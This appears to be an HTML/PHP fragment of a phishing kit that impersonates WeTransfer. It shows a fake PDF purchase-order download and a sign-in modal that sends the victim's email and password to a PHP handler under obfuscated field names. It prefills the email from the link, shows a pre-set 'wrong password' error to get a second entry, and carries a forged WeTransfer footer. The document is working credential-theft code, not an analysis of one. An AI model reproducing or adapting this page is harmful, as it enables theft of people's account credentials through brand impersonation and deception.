...
<div class="waithi" style="border: none;">Got Plus?</div>
  ...
  <br><div class="pedi">
<div style=" text-align: left; margin-left: 22px; font-size: 14px; color: black; padding-top: 4px; ">PO-DOC81725393825233.PDF<div style="font-size: 10px;color: gray;">150 KB . PDF</div></div>
  </div>
...
<div class="modal fade" id="myModal" role="dialog" style="padding: 0!important;overflow: hidden;">
    <div class="modal-dialog" style="margin-top: 48px;width: 538px;Background: transparent;float: right;height: 100vh; overflow: hidden;border-radius: 16px 0 0 45px;">
     ...
     <div class="modal-body">
		 ...
		 <div>
		 <form method="post" action="8272837.php" >
 
		 <small style="color: red;"><div>Wrong Email ID or Password. Please try again</div></small>
		  <div>Sign in with your email address to download now</div><br>
		 <input type="email" name="sweetsjhj" placeholder="example@company.com" tabindex="1" required="" class="" autofocus="1" style="width: 100%;height: 51px;padding-left: 10px;background: #fff;outline: 0;border: solid 1px #F44336 !important" value="<?php echo $email_from_link;?>"> </div>
 <br>
<div style="">
 <input type="password" name="bymyhs" placeholder="Enter Password
" tabindex="1" required="" class="" value="" style="width: 100%;width: 100%;height: 51px;padding-left: 10px;background: #ffffff;border: solid 1px #F44336 !important;outline: 0; "> 
 </div>
...
<div id="oneoo" style="padding-top: 12px; font-size: 12px; position: fixed;bottom: 0; text-align: center; width: 100%;     padding-bottom: 9px; cursor: pointer;">©2021 Wetransfer &nbsp; &nbsp; Terms of use  &nbsp; &nbsp;Privacy and cookies </div>
        </div>
       </form>
      </div>
